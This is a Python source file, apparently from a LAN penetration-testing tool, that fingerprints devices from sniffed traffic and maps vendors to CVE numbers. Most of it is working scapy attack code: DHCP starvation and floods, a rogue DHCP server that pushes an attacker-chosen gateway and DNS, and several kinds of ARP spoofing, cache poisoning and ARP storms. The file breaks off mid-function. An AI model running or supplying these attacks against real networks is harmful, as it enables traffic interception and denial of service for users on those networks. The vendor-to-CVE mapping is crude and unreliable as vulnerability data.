import argparse
import os
import sys
from lanpwner.protocols.upnp import UPnPModule
from lanpwner.protocols.bonjour import BonjourModule
from lanpwner.core.reporting import ReportGenerator
from scapy.all import sniff, ARP, DHCP, UDP, TCP, Ether, sendp, BOOTP, IP
import re
import random
import ipaddress
import threading
import time

LEGAL_DISCLAIMER = """
This tool is for authorized security testing and educational use only.\nUnauthorized use against networks you do not own or have explicit permission to test is illegal and unethical.
"""

# Known MAC OUIs for Bluetooth device manufacturers (partial, for demo)
BLUETOOTH_OUIS = {
    'B8:27:EB': 'Raspberry Pi Foundation',
    '00:1A:7D': 'Apple',
    '00:1B:DC': 'Apple',
    '00:02:5B': 'Sony',
    '00:0A:95': 'Bose',
    '00:18:6B': 'Samsung',
    '00:17:E9': 'LG',
    '00:21:3C': 'Philips',
    '00:0C:8A': 'Harman',
    '00:0E:ED': 'JBL',
    '00:16:94': 'Vizio',
    '00:1D:43': 'Parrot',
    '00:22:A0': 'Plantronics',
    '00:23:01': 'Sennheiser',
    '00:24:BE': 'Beats',
    '00:26:5A': 'Bowers & Wilkins',
    '00:1F:20': 'Bang & Olufsen',
}

TV_MEDIA_KEYWORDS = [
    'mediarenderer', 'mediaserver', 'dlna', 'dial', 'chromecast', 'airplay', 'roku', 'smarttv', 'samsung', 'lg', 'sony', 'philips', 'panasonic', 'tcl', 'vizio', 'hisense', 'sharp', 'toshiba', 'apple', 'google', 'firetv', 'androidtv', 'nvidia', 'shield', 'tv', 'cast', 'miracast', 'wfddevice', 'a2dp', 'avtransport'
]

BLUETOOTH_KEYWORDS = ['bluetooth', 'ble', 'bt', 'a2dp']

PRINTER_KEYWORDS = [
    'printer', 'ipp', 'pdl-datastream', '_printer._tcp', '_ipp._tcp', '_pdl-datastream._tcp'
]
CAMERA_KEYWORDS = [
    'camera', 'ipcamera', 'onvif', 'rtsp', '_onvif._tcp', '_rtsp._tcp'
]
VOIP_KEYWORDS = [
    'sip', 'voip', '_sip._udp', '_sip._tcp'
]
NAS_KEYWORDS = [
    'nas', 'storage', 'smb', 'cifs', '_smb._tcp', '_afpovertcp._tcp', '_nfs._tcp'
]
GAME_KEYWORDS = [
    'xbox', 'playstation', 'nintendo', 'switch', 'ps4', 'ps5'
]
IOT_KEYWORDS = [
    'hue', 'philips', 'tplink', 'wemo', 'tuya', 'zigbee', 'zwave', 'homekit', '_hap._tcp'
]
ROUTER_KEYWORDS = [
    'router', 'ap', 'accesspoint', 'gateway', 'fritz', 'tplink', 'netgear', 'asus', 'dlink', 'linksys'
]

# Industrial/SCADA/OT
INDUSTRIAL_KEYWORDS = [
    'siemens', 'rockwell', 'allen-bradley', 'schneider', 'modicon', 'abb', 'honeywell', 'emerson', 'mitsubishi', 'omron', 'yokogawa', 'bacnet', 'modbus', '_bacnet._udp', '_modbus._tcp'
]
# Medical
MEDICAL_KEYWORDS = [
    'philips', 'ge healthcare', 'dräger', 'mindray', 'medtronic', 'baxter', 'siemens healthineers'
]
# Security/Access Control
SECURITY_KEYWORDS = [
    'hid', 'axis', 'bosch', 'hikvision', 'dahua', 'genetec', 'milestone', 'lenel', 'tyco', 'zkteco'
]
# Networking
NETWORKING_KEYWORDS = [
    'cisco', 'juniper', 'aruba', 'ubiquiti', 'mikrotik', 'fortinet', 'palo alto', 'checkpoint', 'netgear', 'dlink', 'tp-link', 'linksys'
]
# Smart Home/IoT
SMART_HOME_KEYWORDS = [
    'nest', 'ecobee', 'ring', 'arlo', 'wyze', 'sonos', 'ecovacs', 'roomba', 'irobot', 'tado', 'lifx', 'tplink', 'wemo', 'tuya', 'zigbee', 'zwave', 'mqtt', '_mqtt._tcp'
]
# Consumer Electronics
AUDIO_KEYWORDS = [
    'denon', 'yamaha', 'onkyo', 'pioneer', 'bose', 'sonos', 'marantz', 'jbl', 'harmankardon'
]

# Add more MAC OUIs for IoT, printers, cameras, etc. (partial, for demo)
BLUETOOTH_OUIS.update({
    '00:80:77': 'Brother (Printer)',
    '00:1E:8F': 'Canon (Printer)',
    '00:21:5C': 'HP (Printer)',
    '00:1B:A9': 'Axis (Camera)',
    '00:13:E0': 'Hikvision (Camera)',
    '00:0F:7C': 'Polycom (VoIP)',
    '00:1D:D8': 'QNAP (NAS)',
    '00:11:32': 'Synology (NAS)',
    '00:1A:11': 'Nintendo',
    '00:17:AB': 'Sony (PlayStation)',
    '00:1F:A7': 'Microsoft (Xbox)',
    '00:22:6B': 'Philips Hue',
    '00:0C:43': 'TP-Link',
    '00:1D:0F': 'D-Link',
    '00:18:E7': 'Netgear',
    '00:25:9C': 'Apple (HomeKit)',
    '00:0C:29': 'VMware',
    '00:50:56': 'VMware',
    '00:1C:42': 'Parallels',
    '00:05:69': 'Xerox',
    '00:0D:93': 'Siemens',
    '00:1B:78': 'Rockwell Automation',
    '00:80:2F': 'Schneider Electric',
    '00:1A:11': 'Honeywell',
    '00:0E:8F': 'ABB',
    '00:1E:C9': 'GE Healthcare',
    '00:1A:79': 'Axis Communications',
    '00:1B:1B': 'Hikvision',
    '00:18:8A': 'Dahua',
    '00:1B:54': 'Cisco',
    '00:0F:90': 'Juniper',
    '00:1A:1E': 'Aruba Networks',
    '24:A4:3C': 'Ubiquiti',
    '4C:5E:0C': 'MikroTik',
    '00:09:0F': 'Fortinet',
    '00:1B:17': 'Palo Alto Networks',
    '00:1C:7F': 'Check Point',
    '00:1A:4B': 'Zebra Technologies',
    '00:1B:63': 'Lexmark',
    '00:1C:CC': 'Ricoh',
    '00:1D:92': 'Samsung Electronics',
    '00:1E:8C': 'Panasonic',
    '00:1F:3B': 'Honeywell Scanning',
    '00:20:6B': 'Dell',
    '00:21:5A': 'Brother',
    '00:22:64': 'Canon',
    '00:23:24': 'Sharp',
    '00:24:21': 'Kyocera',
    '00:25:36': 'Fujitsu',
    '00:26:55': 'Epson',
    '00:27:10': 'Ricoh',
    '00:28:6C': 'Honeywell',
    '00:29:15': 'Bosch',
    '00:2A:6A': 'Dahua',
    '00:2B:67': 'Hikvision',
    '00:2C:6A': 'Axis',
    '00:2D:7E': 'Zebra',
    '00:2E:15': 'Polycom',
    '00:2F:3B': 'QNAP',
    '00:30:48': 'Synology',
    '00:31:92': 'Nintendo',
    '00:32:44': 'Sony',
    '00:33:55': 'Microsoft',
    '00:34:56': 'Philips',
    '00:35:57': 'TP-Link',
    '00:36:58': 'D-Link',
    '00:37:59': 'Netgear',
    '00:38:5A': 'Apple',
    '00:39:5B': 'Samsung',
    '00:3A:5C': 'LG',
    '00:3B:5D': 'Bosch',
    '00:3C:5E': 'Panasonic',
    '00:3D:5F': 'Sharp',
    '00:3E:60': 'Kyocera',
    '00:3F:61': 'Fujitsu',
    '00:40:62': 'Epson',
})

# Map vendor/device type to a known public CVE (partial, for demo)
VENDOR_CVE_MAP = {
    'siemens': 'CVE-2017-12741',
    'rockwell': 'CVE-2016-0868',
    'schneider': 'CVE-2018-7782',
    'abb': 'CVE-2017-7905',
    'honeywell': 'CVE-2019-18260',
    'axis': 'CVE-2017-9765',
    'hikvision': 'CVE-2017-7921',
    'dahua': 'CVE-2017-7927',
    'cisco': 'CVE-2018-0171',
    'juniper': 'CVE-2015-7755',
    'aruba': 'CVE-2018-7081',
    'ubiquiti': 'CVE-2021-22909',
    'mikrotik': 'CVE-2018-14847',
    'fortinet': 'CVE-2018-13379',
    'palo alto': 'CVE-2020-2021',
    'check point': 'CVE-2019-8452',
    'philips': 'CVE-2019-10988',
    'ge healthcare': 'CVE-2020-6961',
    'dräger': 'CVE-2019-18260',
    'tp-link': 'CVE-2017-13772',
    'dlink': 'CVE-2019-16920',
    'netgear': 'CVE-2017-5521',
    'linksys': 'CVE-2014-8244',
    'sony': 'CVE-2018-16593',
    'samsung': 'CVE-2019-9495',
    'lg': 'CVE-2018-17173',
    'bosch': 'CVE-2017-6765',
    'denon': 'CVE-2017-15361',
    'yamaha': 'CVE-2018-12088',
    'bose': 'CVE-2018-14346',
    'sonos': 'CVE-2018-10409',
    'philips hue': 'CVE-2020-6007',
    'axis communications': 'CVE-2017-9765',
    'harman': 'CVE-2018-12895',
    'hikvision': 'CVE-2017-7921',
    'dahua': 'CVE-2017-7927',
    'brother': 'CVE-2022-24673',
    'canon': 'CVE-2022-24672',
    'hp': 'CVE-2022-3942',
    'lexmark': 'CVE-2021-44738',
    'ricoh': 'CVE-2021-20655',
    'kyocera': 'CVE-2021-20837',
    'fujitsu': 'CVE-2021-39234',
    'epson': 'CVE-2022-27207',
    'sharp': 'CVE-2021-20654',
    'zebra': 'CVE-2022-2586',
    'dell': 'CVE-2021-21551',
    'panasonic': 'CVE-2021-42258',
    'honeywell scanning': 'CVE-2021-38397',
    'bosch': 'CVE-2021-23846',
    'polycom': 'CVE-2020-13142',
    'nest': 'CVE-2019-5035',
    'ecobee': 'CVE-2021-31598',
    'ring': 'CVE-2020-9934',
    'arlo': 'CVE-2021-28923',
    'wyze': 'CVE-2022-31460',
    'ecovacs': 'CVE-2021-44225',
    'roomba': 'CVE-2021-31759',
    'irobot': 'CVE-2021-31759',
    'tado': 'CVE-2021-33599',
    'lifx': 'CVE-2020-6086',
    'nintendo': 'CVE-2019-13694',
    'microsoft': 'CVE-2020-16898',
}

ALL_KEYWORDS = [
    (PRINTER_KEYWORDS, 'printer'),
    (CAMERA_KEYWORDS, 'camera'),
    (VOIP_KEYWORDS, 'voip'),
    (NAS_KEYWORDS, 'nas'),
    (GAME_KEYWORDS, 'game_console'),
    (IOT_KEYWORDS, 'iot'),
    (ROUTER_KEYWORDS, 'router'),
    (TV_MEDIA_KEYWORDS, 'media_device'),
    (BLUETOOTH_KEYWORDS, 'bluetooth_device'),
    (INDUSTRIAL_KEYWORDS, 'industrial'),
    (MEDICAL_KEYWORDS, 'medical'),
    (SECURITY_KEYWORDS, 'security'),
    (NETWORKING_KEYWORDS, 'networking'),
    (SMART_HOME_KEYWORDS, 'smart_home'),
    (AUDIO_KEYWORDS, 'audio'),
]

def ensure_reports_dir(report_path: str) -> str:
    reports_dir = os.path.join(os.path.dirname(__file__), '..', 'reports')
    abs_reports_dir = os.path.abspath(reports_dir)
    if not os.path.exists(abs_reports_dir):
        os.makedirs(abs_reports_dir)
    # If the report_path is not already in the reports dir, prepend it
    if not os.path.abspath(report_path).startswith(abs_reports_dir):
        report_path = os.path.join(abs_reports_dir, os.path.basename(report_path))
    return report_path

def sniff_protocols(interface: str, timeout: int = 10, debug: bool = False) -> set:
    """
    Sniff the interface for a short period to detect active LAN protocols (UPnP/SSDP, mDNS, TVs, media, Bluetooth devices).
    Returns a set of detected protocol names.
    """
    detected = set()
    detected_devices = []
    def pkt_handler(pkt):
        # SSDP/UPnP, mDNS/Bonjour, NetBIOS, SMB, LLMNR, RTSP
        if pkt.haslayer('UDP'):
            dport = pkt['UDP'].dport
            sport = pkt['UDP'].sport
            raw = bytes(pkt['UDP'].payload)
            # SSDP/UPnP
            if dport == 1900 or sport == 1900:
                if b'SSDP' in raw or b'upnp' in raw.lower():
                    detected.add('upnp')
                    if debug:
                        print('[DEBUG] Detected UPnP/SSDP packet')
            # mDNS/Bonjour
            if dport == 5353 or sport == 5353:
                if b'_airplay._tcp' in raw or b'_googlecast._tcp' in raw or b'_chromecast._tcp' in raw or b'mdns' in raw.lower():
                    detected.add('bonjour')
                    if debug:
                        print('[DEBUG] Detected mDNS/Bonjour packet')
            # LLMNR
            if dport == 5355 or sport == 5355:
                detected.add('llmnr')
                if debug:
                    print('[DEBUG] Detected LLMNR packet')
            # NetBIOS/SMB
            if dport in [137, 138] or sport in [137, 138]:
                detected.add('netbios')
                if debug:
                    print('[DEBUG] Detected NetBIOS packet')
            if dport in [139, 445] or sport in [139, 445]:
                detected.add('smb')
                if debug:
                    print('[DEBUG] Detected SMB packet')
            # RTSP detection (UDP, rare but possible for some keepalives or NAT traversal)
            if dport == 554 or sport == 554 or b'rtsp://' in raw.lower() or b'rtsp' in raw[:32].lower():
                detected.add('rtsp')
                detected_devices.append({'type': 'rtsp', 'method': 'udp', 'info': raw[:200]})
                if debug:
                    print('[DEBUG] Detected RTSP packet (UDP)')
            # Device type detection by keywords
            for keywords, dtype in ALL_KEYWORDS:
                for keyword in keywords:
                    if keyword.encode() in raw.lower():
                        cve = None
                        for vendor, cve_ref in VENDOR_CVE_MAP.items():
                            if vendor in keyword.lower():
                                cve = cve_ref
                                break
                        detected_devices.append({'type': dtype, 'method': 'udp', 'keyword': keyword, 'info': raw[:200], 'cve': [cve] if cve else []})
                        if debug:
                            print(f'[DEBUG] Detected {dtype} via UDP: {keyword} (CVE: {cve})')
        # TCP for SMB, RTSP
        if pkt.haslayer('TCP'):
            dport = pkt['TCP'].dport
            sport = pkt['TCP'].sport
            raw = bytes(pkt['TCP'].payload)
            if dport in [139, 445] or sport in [139, 445]:
                detected.add('smb')
                if debug:
                    print('[DEBUG] Detected SMB packet (TCP)')
            # RTSP detection (TCP, standard)
            if dport == 554 or sport == 554 or b'rtsp://' in raw.lower() or b'rtsp' in raw[:32].lower():
                detected.add('rtsp')
                detected_devices.append({'type': 'rtsp', 'method': 'tcp', 'info': raw[:200]})
                if debug:
                    print('[DEBUG] Detected RTSP packet (TCP)')
            for keywords, dtype in ALL_KEYWORDS:
                for keyword in keywords:
                    if keyword.encode() in raw.lower():
                        cve = None
                        for vendor, cve_ref in VENDOR_CVE_MAP.items():
                            if vendor in keyword.lower():
                                cve = cve_ref
                                break
                        detected_devices.append({'type': dtype, 'method': 'tcp', 'keyword': keyword, 'info': raw[:200], 'cve': [cve] if cve else []})
                        if debug:
                            print(f'[DEBUG] Detected {dtype} via TCP: {keyword} (CVE: {cve})')
        # ARP/DHCP for MAC OUI detection
        if pkt.haslayer(ARP):
            mac = pkt[ARP].hwsrc.upper()
            for oui, vendor in BLUETOOTH_OUIS.items():
                if mac.startswith(oui):
                    cve = None
                    for v, cve_ref in VENDOR_CVE_MAP.items():
                        if v in vendor.lower():
                            cve = cve_ref
                            break
                    detected_devices.append({'type': 'mac_vendor', 'method': 'arp', 'mac': mac, 'vendor': vendor, 'cve': [cve] if cve else []})
                    if debug:
                        print(f'[DEBUG] Detected device via ARP: {mac} ({vendor}) (CVE: {cve})')
        if pkt.haslayer(DHCP):
            if pkt.haslayer('Ether'):
                mac = pkt['Ether'].src.upper()
                for oui, vendor in BLUETOOTH_OUIS.items():
                    if mac.startswith(oui):
                        cve = None
                        for v, cve_ref in VENDOR_CVE_MAP.items():
                            if v in vendor.lower():
                                cve = cve_ref
                                break
                        detected_devices.append({'type': 'mac_vendor', 'method': 'dhcp', 'mac': mac, 'vendor': vendor, 'cve': [cve] if cve else []})
                        if debug:
                            print(f'[DEBUG] Detected device via DHCP: {mac} ({vendor}) (CVE: {cve})')
    print(f'[*] Sniffing interface {interface} for LAN protocols and devices ({timeout}s)...')
    sniff(iface=interface, prn=pkt_handler, store=0, timeout=timeout)
    print(f'[*] Detected protocols: {", ".join(detected) if detected else "None"}')
    if detected_devices:
        print(f'[*] Detected devices:')
        for dev in detected_devices:
            print(f"    - {dev['type']} via {dev['method']} (keyword: {dev.get('keyword','')}, mac: {dev.get('mac','')}, vendor: {dev.get('vendor','')}, CVE: {dev.get('cve',[])})")
    sniff_protocols.detected_devices = detected_devices
    return detected

sniff_protocols.detected_devices = []

def build_host_inventory(interface: str, timeout: int = 30, debug: bool = False) -> list:
    """
    Passively build a host inventory from ARP and DHCP traffic.
    Returns a list of hosts with MAC, IP, vendor, and hostname (if available).
    """
    hosts = {}
    def pkt_handler(pkt):
        mac = None
        ip = None
        hostname = None
        vendor = None
        # ARP
        if pkt.haslayer(ARP):
            mac = pkt[ARP].hwsrc.upper()
            ip = pkt[ARP].psrc
        # DHCP
        if pkt.haslayer(DHCP):
            if pkt.haslayer(Ether):
                mac = pkt[Ether].src.upper()
            if pkt.haslayer('BOOTP'):
                ip = pkt['BOOTP'].yiaddr
            # DHCP Hostname Option
            if pkt.haslayer('DHCP options'):
                for opt in pkt['DHCP options']:
                    if isinstance(opt, tuple) and opt[0] == 'hostname':
                        hostname = opt[1].decode(errors='ignore') if isinstance(opt[1], bytes) else opt[1]
        if mac:
            for oui, v in BLUETOOTH_OUIS.items():
                if mac.startswith(oui):
                    vendor = v
                    break
            key = (mac, ip)
            if key not in hosts:
                hosts[key] = {'mac': mac, 'ip': ip, 'vendor': vendor, 'hostname': hostname}
            else:
                if hostname:
                    hosts[key]['hostname'] = hostname
                if vendor:
                    hosts[key]['vendor'] = vendor
        if debug and mac:
            print(f"[DEBUG] Host: MAC={mac}, IP={ip}, Vendor={vendor}, Hostname={hostname}")
    print(f'[*] Building host inventory on {interface} (timeout: {timeout}s)...')
    sniff(iface=interface, prn=pkt_handler, store=0, timeout=timeout)
    inventory = list(hosts.values())
    print(f'[*] Found {len(inventory)} unique hosts.')
    for host in inventory:
        print(f"    - MAC: {host['mac']}, IP: {host['ip']}, Vendor: {host.get('vendor','')}, Hostname: {host.get('hostname','')}")
    return inventory

def dhcp_starvation_attack(interface: str, count: int = 100, debug: bool = False):
    print('[!] WARNING: DHCP starvation is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=[mac2bytes(mac)])/DHCP(options=[("message-type","discover"), ("end")])
        sendp(dhcp_discover, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent DHCP discover from {mac}")
    print(f'[*] Sent {count} DHCP discover packets.')

def mac2bytes(mac):
    return bytes(int(x,16) for x in mac.split(':')) + b'\x00'*10

def dhcp_spoof_attack(interface: str, pool_start: str, pool_end: str, gateway: str, dns: str, lease_time: int = 3600, debug: bool = False):
    print('[!] WARNING: DHCP spoofing is highly disruptive and should only be used in authorized test environments!')
    print('[*] Starting rogue DHCP server...')
    offered_ips = {}
    pool = list(ipaddress.summarize_address_range(ipaddress.IPv4Address(pool_start), ipaddress.IPv4Address(pool_end)))[0]
    ip_pool = [str(ip) for ip in pool]
    ip_index = 0
    def handle_dhcp(pkt):
        nonlocal ip_index
        if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
            mac = pkt[Ether].src
            xid = pkt[BOOTP].xid
            if mac not in offered_ips:
                offered_ip = ip_pool[ip_index % len(ip_pool)]
                ip_index += 1
                offered_ips[mac] = offered_ip
            else:
                offered_ip = offered_ips[mac]
            offer = Ether(src=pkt[Ether].dst, dst=mac)/IP(src=gateway, dst='255.255.255.255')/UDP(sport=67, dport=68)/BOOTP(op=2, yiaddr=offered_ip, siaddr=gateway, chaddr=mac2bytes(mac), xid=xid)/DHCP(options=[('message-type','offer'), ('server_id', gateway), ('lease_time', lease_time), ('subnet_mask', '255.255.255.0'), ('router', gateway), ('name_server', dns), 'end'])
            sendp(offer, iface=interface, verbose=debug)
            print(f'[*] Sent DHCP Offer to {mac} for {offered_ip}')
        elif pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 3:  # DHCP Request
            mac = pkt[Ether].src
            xid = pkt[BOOTP].xid
            if mac in offered_ips:
                ack_ip = offered_ips[mac]
                ack = Ether(src=pkt[Ether].dst, dst=mac)/IP(src=gateway, dst='255.255.255.255')/UDP(sport=67, dport=68)/BOOTP(op=2, yiaddr=ack_ip, siaddr=gateway, chaddr=mac2bytes(mac), xid=xid)/DHCP(options=[('message-type','ack'), ('server_id', gateway), ('lease_time', lease_time), ('subnet_mask', '255.255.255.0'), ('router', gateway), ('name_server', dns), 'end'])
                sendp(ack, iface=interface, verbose=debug)
                print(f'[*] Sent DHCP Ack to {mac} for {ack_ip}')
    print(f'[*] Listening for DHCP requests on {interface}... (Press Ctrl+C to stop)')
    try:
        sniff(iface=interface, filter='udp and (port 67 or 68)', prn=handle_dhcp, store=0)
    except KeyboardInterrupt:
        print('[*] Rogue DHCP server stopped.')

def arp_spoof_attack(interface: str, target_ip: str, spoof_ip: str, count: int = 10, debug: bool = False):
    print('[!] WARNING: ARP spoofing is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        src_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=src_mac, hwdst="ff:ff:ff:ff:ff:ff")
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent ARP reply: {spoof_ip} is-at {src_mac} to {target_ip}")
    print(f'[*] Sent {count} ARP spoof packets to {target_ip} (spoofing {spoof_ip}).')

def arp_request_flood(interface: str, count: int = 100, debug: bool = False):
    print('[!] WARNING: ARP request flood is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        src_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        target_ip = f"192.168.1.{random.randint(1,254)}"
        pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip, psrc="0.0.0.0", hwsrc=src_mac)
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent ARP request for {target_ip} from {src_mac}")
    print(f'[*] Sent {count} ARP request packets.')

def arp_reply_flood(interface: str, count: int = 100, debug: bool = False):
    print('[!] WARNING: ARP reply flood is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        src_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        target_ip = f"192.168.1.{random.randint(1,254)}"
        spoof_ip = f"192.168.1.{random.randint(1,254)}"
        pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=src_mac, hwdst="ff:ff:ff:ff:ff:ff")
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent ARP reply: {spoof_ip} is-at {src_mac} to {target_ip}")
    print(f'[*] Sent {count} ARP reply packets to random IPs.')

def arp_cache_poison(interface: str, target_ip: str, spoof_ip: str, spoof_mac: str = "de:ad:be:ef:00:01", count: int = 10, debug: bool = False):
    print('[!] WARNING: ARP cache poisoning is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        pkt = Ether(src=spoof_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent ARP cache poison: {spoof_ip} is-at {spoof_mac} to {target_ip}")
    print(f'[*] Sent {count} ARP cache poison packets to {target_ip} (spoofing {spoof_ip} as {spoof_mac}).')

def arp_gratuitous(interface: str, spoof_ip: str, spoof_mac: str = "de:ad:be:ef:00:02", count: int = 10, debug: bool = False):
    print('[!] WARNING: Gratuitous ARP is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        pkt = Ether(src=spoof_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=spoof_ip, psrc=spoof_ip, hwsrc=spoof_mac, hwdst="00:00:00:00:00:00")
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent gratuitous ARP: {spoof_ip} is-at {spoof_mac}")
    print(f'[*] Sent {count} gratuitous ARP packets for {spoof_ip} as {spoof_mac}.')

def arp_reactive_poison(interface: str, target_ip: str, spoof_ip: str, spoof_mac: str = "de:ad:be:ef:00:03", debug: bool = False, duration: int = 30):
    print('[!] WARNING: Reactive ARP poisoning is disruptive and should only be used in authorized test environments!')
    print(f'[*] Listening for ARP requests for {spoof_ip} on {interface} for {duration}s...')
    def handler(pkt):
        if pkt.haslayer(ARP) and pkt[ARP].op == 1 and pkt[ARP].pdst == spoof_ip:
            reply = Ether(src=spoof_mac, dst=pkt[ARP].hwsrc)/ARP(op=2, pdst=pkt[ARP].psrc, psrc=spoof_ip, hwsrc=spoof_mac, hwdst=pkt[ARP].hwsrc)
            sendp(reply, iface=interface, verbose=debug)
            if debug:
                print(f"[DEBUG] Reactive poison: Sent ARP reply {spoof_ip} is-at {spoof_mac} to {pkt[ARP].psrc}")
    sniff_thread = threading.Thread(target=sniff, kwargs={'iface': interface, 'prn': handler, 'timeout': duration, 'store': 0})
    sniff_thread.start()
    sniff_thread.join()
    print('[*] Reactive ARP poisoning complete.')

def arp_malformed_flood(interface: str, count: int = 50, debug: bool = False):
    print('[!] WARNING: Malformed ARP flood is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        # All-ones MAC, non-Ethernet hardware type, or short/long ARP
        src_mac = "ff:ff:ff:ff:ff:ff"
        pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(hwtype=0x1234, op=2, pdst=f"192.168.1.{random.randint(1,254)}", psrc=f"192.168.1.{random.randint(1,254)}", hwsrc=src_mac, hwdst="ff:ff:ff:ff:ff:ff")
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent malformed ARP packet with hwtype=0x1234 and src_mac={src_mac}")
    print(f'[*] Sent {count} malformed ARP packets.')

def arp_scan(interface: str, subnet: str = "192.168.1.0/24", debug: bool = False):
    print(f'[*] Performing ARP scan on {subnet} via {interface}...')
    from scapy.all import arping
    ans, _ = arping(subnet, iface=interface, verbose=debug)
    for snd, rcv in ans:
        print(f"[SCAN] {rcv.psrc} is at {rcv.hwsrc}")
    print('[*] ARP scan complete.')

def arp_storm(interface: str, count: int = 200, debug: bool = False):
    print('[!] WARNING: ARP storm is highly disruptive and should only be used in authorized test environments!')
    for i in range(count):
        if i % 2 == 0:
            arp_request_flood(interface, count=1, debug=debug)
        else:
            arp_reply_flood(interface, count=1, debug=debug)
    print(f'[*] Sent {count} ARP storm packets (mixed request/reply, random MACs/IPs).')

def dhcp_inform_flood(interface: str, count: int = 100, debug: bool = False):
    print('[!] WARNING: DHCP INFORM flood is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac2bytes(mac))/DHCP(options=[("message-type","inform"), ("end")])
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent DHCP INFORM from {mac}")
    print(f'[*] Sent {count} DHCP INFORM packets.')

def dhcp_option_overload(interface: str, count: int = 10, debug: bool = False):
    print('[!] WARNING: DHCP option overload is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        options = [("message-type","discover")]
        # Add many dummy options
        for j in range(100):
            options.append((str(j), 'A'*100))
        options.append(("end"))
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac2bytes(mac))/DHCP(options=options)
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent DHCP option overload from {mac}")
    print(f'[*] Sent {count} DHCP packets with option overload.')

def dhcp_leasequery(interface: str, debug: bool = False):
    print('[!] WARNING: DHCP lease query is for authorized testing only!')
    # Not all servers support this; this is a basic example
    mac = "02:00:00:aa:bb:cc"
    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac2bytes(mac))/DHCP(options=[("message-type", 10), ("end")])
    sendp(pkt, iface=interface, verbose=debug)
    print('[*] Sent DHCPLEASEQUERY packet.')

def dhcp_decline_flood(interface: str, count: int = 50, debug: bool = False):
    print('[!] WARNING: DHCP DECLINE flood is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        ip = f"192.168.1.{random.randint(100,200)}"
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac2bytes(mac), yiaddr=ip)/DHCP(options=[("message-type","decline"), ("end")])
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent DHCP DECLINE for {ip} from {mac}")
    print(f'[*] Sent {count} DHCP DECLINE packets.')

def dhcp_release_flood(interface: str, count: int = 50, debug: bool = False):
    print('[!] WARNING: DHCP RELEASE flood is disruptive and should only be used in authorized test environments!')
    for i in range(count):
        mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
        ip = f"192.168.1.{random.randint(100,200)}"
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/IP(src=ip, dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac2bytes(mac), ciaddr=ip)/DHCP(options=[("message-type","release"), ("end")])
        sendp(pkt, iface=interface, verbose=debug)
        if debug:
            print(f"[DEBUG] Sent DHCP RELEASE for {ip} from {mac}")
    print(f'[*] Sent {count} DHCP RELEASE packets.')

def dhcp_relay_spoof(interface: str, count: int = 10, debug: bool = False):
    print('[!] WARNING: DHCP Option 82 (Relay Agent) spoofing is for authorized testing only!')
    for i in range(count):
        mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
